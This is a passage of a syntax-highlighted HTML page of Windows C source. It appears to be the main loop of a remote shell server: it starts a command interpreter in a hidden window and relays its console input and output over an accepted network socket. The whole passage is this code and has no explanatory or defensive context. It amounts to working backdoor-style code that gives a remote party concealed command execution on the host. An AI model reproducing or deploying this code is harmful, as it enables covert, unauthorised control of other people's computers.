        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc1">/* for redirection stuff */</span><span class="sc0">
 </span><span class="sc11">ZeroMemory</span><span class="sc10">(&amp;</span><span class="sc11">sinfo</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sinfo</span><span class="sc10">));</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">cb</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sinfo</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">dwFlags</span><span class="sc10">=</span><span class="sc11">STARTF_USESTDHANDLES</span><span class="sc10">|</span><span class="sc11">STARTF_USESHOWWINDOW</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">hStdOutput</span><span class="sc10">=</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">hStdError</span><span class="sc10">=</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">hStdInput</span><span class="sc10">=</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
 </span><span class="sc11">sinfo</span><span class="sc10">.</span><span class="sc11">wShowWindow</span><span class="sc10">=</span><span class="sc11">SW_HIDE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc1">/* try command.com */</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">CreateProcess</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSH_COMMAND</span><span class="sc10">],</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">,</span><span class="sc11">CREATE_NEW_CONSOLE</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">sinfo</span><span class="sc10">,&amp;</span><span class="sc11">pinfo</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* if fails close connection */</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">connection</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc11">connection</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

 </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">connection</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

 </span><span class="sc1">/* read from console */</span><span class="sc0">
 </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">PeekNamedPipe</span><span class="sc10">(</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">resultdw</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resultdw</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">pipeOut</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],&amp;</span><span class="sc11">inbyt</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,&amp;</span><span class="sc11">resultdw</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resultdw</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,&amp;</span><span class="sc11">inbyt</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">resultdw</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* write into console */</span><span class="sc0">
 </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FD_ZERO</span><span class="sc10">(&amp;</span><span class="sc11">readfds</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">FD_SET</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,&amp;</span><span class="sc11">readfds</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">timev</span><span class="sc10">.</span><span class="sc11">tv_sec</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">timev</span><span class="sc10">.</span><span class="sc11">tv_usec</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">select</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,&amp;</span><span class="sc11">readfds</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">timev</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FD_ISSET</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,&amp;</span><span class="sc11">readfds</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">nbytes</span><span class="sc10">=</span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">,&amp;</span><span class="sc11">inbyt</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">nbytes</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],&amp;</span><span class="sc11">inbyt</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,&amp;</span><span class="sc11">resultdw</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc1">/* end process if neeed: exit\n\r */</span><span class="sc0">
                        </span><span class="sc1">/* not the best way, dirty exit if connection
                           lost/error */</span><span class="sc0">
                        </span><span class="sc11">GetExitCodeProcess</span><span class="sc10">(</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,&amp;</span><span class="sc11">resultdw</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resultdw</span><span class="sc10">==</span><span class="sc11">STILL_ACTIVE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                                </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">pipeIn</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_EXIT</span><span class="sc10">],</span><span class="sc0">
                                        </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">rsh_mess</span><span class="sc10">[</span><span class="sc11">RSHM_EXIT</span><span class="sc10">]),&amp;</span><span class="sc11">resultdw</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">connection</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">nbytes</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc11">nbytes</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">nbytes</span><span class="sc10">&gt;</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

 </span><span class="sc1">/* if command ends, just close connection */</span><span class="sc0">
 </span><span class="sc11">GetExitCodeProcess</span><span class="sc10">(</span><span class="sc11">pinfo</span><span class="sc10">.</span><span class="sc11">hProcess</span><span class="sc10">,&amp;</span><span class="sc11">resultdw</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">resultdw</span><span class="sc10">!=</span><span class="sc11">STILL_ACTIVE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">nsfd</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">connection</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc10">}</span><span class="sc0">

 </span><span class="sc10">}</span><span class="sc0">
 </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span></div></body>
</html>
